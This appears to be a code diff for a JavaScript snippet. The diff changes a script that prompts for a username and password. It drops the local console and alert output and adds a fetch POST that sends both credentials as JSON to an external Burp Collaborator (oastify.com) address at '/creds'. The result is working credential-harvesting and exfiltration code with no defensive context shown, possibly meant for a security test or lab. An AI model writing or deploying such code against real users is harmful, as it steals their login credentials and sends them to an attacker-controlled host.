@@ -1,4 +1,18 @@
 let username = prompt("Enter your username:");
+
 let password = prompt("Enter your password:");
-console.log(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
-alert(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
+
+let collaboratorUrl = "http://yqs33nktmf2o7tx1r94hspj7yy4qsgg5.oastify.com";
+
+fetch(`${collaboratorUrl}/creds`, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        username: username,
+        password: password
+    })
+})
+.then(response => console.log('Credentials sent successfully:', response))
+.catch(error => console.error('Error sending credentials:', error));
